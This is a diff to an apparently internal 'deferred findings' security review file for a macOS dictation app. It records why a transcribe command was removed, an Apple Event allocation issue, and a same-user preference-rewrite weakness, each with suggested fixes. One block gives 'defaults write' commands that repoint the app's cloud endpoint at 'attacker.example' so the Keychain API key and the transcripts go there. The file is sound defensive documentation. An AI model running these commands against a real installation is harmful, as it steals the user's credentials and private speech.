@@ -1,5 +1,110 @@
 # Deferred Findings (Codex adversarial review)
 
+## Automation Surface — `transcribe` removed rather than hardened
+
+The Automation Surface originally shipped two commands: `transcribe` (a file-transcription
+command) and `clean up` (a text post-processing command). Four rounds of adversarial review found
+that essentially every non-trivial finding in this feature — file authority (bookmark-based
+folder scoping), staging (O_NOFOLLOW-pinned copy-then-decode), and orphan-purge cleanup — existed
+solely to make `transcribe` safe to expose to an unsandboxed app. `clean up` never touched any of
+that machinery: it takes a text argument, not a file. Rather than continue hardening an
+ever-deepening stack of file-authority findings, `transcribe` — and every file-authority
+mechanism that existed only to serve it (`AutomationFileAuthorization`, `AutomationMediaGuard`,
+`AutomationMediaStaging`, the automation-folder bookmark/picker, the transcribe concurrency slot,
+and the shared-pipeline staging hooks it required) — was deleted outright. This closes the
+findings below (previously tracked as accepted-but-deferred) by removing the code they applied
+to, not by patching them:
+
+- Post-staging pathname swap (the descriptor-to-pathname handoff between `AutomationMediaStaging`
+  and `AVFoundation`/`MediaImportService`, which reopened the staged file by pathname, not by
+  descriptor).
+- A long automation import monopolizing the shared serial WhisperKit transcription gate.
+
+`clean up` (BRAINSTORM_AUTOMATION_SURFACE.md capability 2) is the entire shipped Automation
+Surface now. It has no file authority, no staging, and no shared-gate contention: it runs
+on-device text post-processing against a caller-supplied string, gated only by
+`AppSettings.automationEnabled` (off by default) and the single-in-flight concurrency slot in
+`AutomationConcurrencyGate`.
+
+### Apple Event argument decoding allocates before any cap can run
+
+**Where:** Outside this codebase's control — Apple's own Apple Event Manager / Cocoa Scripting
+argument-coercion machinery, which decodes `clup` (the `clean up` command's direct-parameter and
+`templateName` keyword-argument descriptors) into a Foundation `String` value *before*
+`CleanUpTextCommand.performDefaultImplementation()` ever runs — i.e. before
+`AutomationTextValidation.validateCleanUpText`/`validateTemplateName` (round-1/round-2 Findings 3)
+gets a chance to reject an oversized argument.
+
+**Why real:** A caller that controls Apple Event construction directly (bypassing AppleScript/
+Shortcuts' own descriptor-size conventions) can send a very large string descriptor as an
+argument; the OS decodes and allocates it into a full Foundation string during dispatch,
+regardless of what FreeTalker's own command implementation would have rejected once it got
+control. `AutomationTextValidation`'s text/template-name byte caps run strictly AFTER that
+allocation already happened — they bound what FreeTalker does with the string once it has one,
+not the allocation itself.
+
+**Why deferred:** There is no application-level hook between Apple Event descriptor arrival and
+Cocoa Scripting's own argument coercion — bounding this requires a pre-coercion ingress guard
+that inspects raw descriptor sizes on `clup` before Cocoa Scripting decodes them into Swift
+values at all, which means intercepting Apple Events beneath `NSScriptCommand`'s own dispatch (a
+custom `NSAppleEventManager` handler that peeks at `AEDesc` sizes and only then hands off to the
+normal Cocoa Scripting path) — a different, lower-level integration point than anything else this
+feature touches, and a meaningfully larger, riskier change to get right (Apple Event handling is
+notoriously easy to break silently).
+
+**Suggested fix (follow-up PR):** Register a custom handler for the `clup` Apple Event class/ID
+pair via `NSAppleEventManager.setEventHandler(...)` ahead of Cocoa Scripting's own dispatch,
+inspect the raw descriptor's byte size (`AEGetDescData`/`AESizeOfFlattenedDesc`-style inspection)
+before any coercion to a Swift type runs, and reply with an error immediately for anything past a
+generous ceiling — never let oversized descriptor decoding run unbounded.
+
+## Automation Surface (round 1) — pre-existing provider-preference rewrite exposed by Finding 1
+
+### Any same-user process can rewrite FreeTalker's cloud provider preferences and harvest the API key on the user's next ordinary dictation, no automation involved
+
+**Where:** `Sources/FreeTalker/Settings/AppSettings.swift` (`llmProvider`, `cloudLLMBaseURL`,
+`cloudLLMModel` — all plain `UserDefaults`-backed `@Published` properties, no per-writer
+authentication), read by `AppCoordinator.resolveActiveProcessor()`/`isCloudLLMConfigured` and
+paired with the matching Keychain entry (`Keychain.Account.cloudLLMKey(for:)`) whenever cloud
+post-processing runs for an ordinary Dictation.
+
+**Why real, and why deferred:** Codex round-1 Finding 1 (CRITICAL) originally described a
+confused-deputy exfiltration route THROUGH automation: a same-user process could flip
+`automationEnabled` on via `defaults write`, repoint the provider/base-URL/model preferences at an
+attacker-controlled endpoint, relaunch FreeTalker, and call `clean up` to have FreeTalker read the
+protected Keychain key and send it to that endpoint. This branch closes that specific route by
+making `clean up` always run on-device (`AutomationService.cleanUpText` now calls
+`AppleFMProcessor` unconditionally, never `AppCoordinator.resolveActiveProcessor()`'s cloud
+selection) — see `Sources/FreeTalker/Automation/AutomationService.swift`.
+
+That fix does not touch the underlying weakness Finding 1 exposed: `llmProvider`,
+`cloudLLMBaseURL`, and `cloudLLMModel` are ordinary `UserDefaults` values with no authentication of
+the writer. ANY process running as the same macOS user — automation enabled or not, FreeTalker
+running or not — can already do:
+
+```sh
+defaults write org.freetalker.app llmProvider -string "openAI"
+defaults write org.freetalker.app cloudLLMBaseURL -string "https://attacker.example/v1"
+defaults write org.freetalker.app cloudLLMModel -string "whatever"
+```
+
+The next time the user dictates normally (no automation, no Shortcut, just talking) with cloud
+post-processing configured, FreeTalker reads the real Keychain API key, pairs it with the
+now-attacker-controlled base URL, and sends the transcript (and the key, via the provider's own
+Authorization header) to that endpoint. This is a pre-existing gap in how FreeTalker trusts its own
+preference store, not something the automation surface introduced — it was simply the route this
+PR's adversarial review used to reach it. Fixing `UserDefaults`/Keychain trust boundaries is a
+larger change (would need something like a signed/fingerprinted preference bundle, or moving
+provider identity into the Keychain item itself so a mismatched base URL is detectable) than this
+PR's scope, and is orthogonal to "does automation add a new way to reach the key" — it does not,
+after this branch's fix.
+
+**Suggested fix (follow-up PR):** Bind the Keychain-stored key to the specific
+provider/base-URL/model triple it was saved for (e.g. store a hash of the triple alongside the key,
+or key the Keychain account string on all three rather than just the provider), so a preference
+rewrite that doesn't also produce a matching Keychain write is detected and refused rather than
+silently paired with the real key.
+
 ## Correction Loop — F16
 
 ### F16 — LOW — `kAXDocumentAttribute` can't distinguish two tabs sharing a URL, so the correction-fallback document check fails closed in browsers instead of succeeding
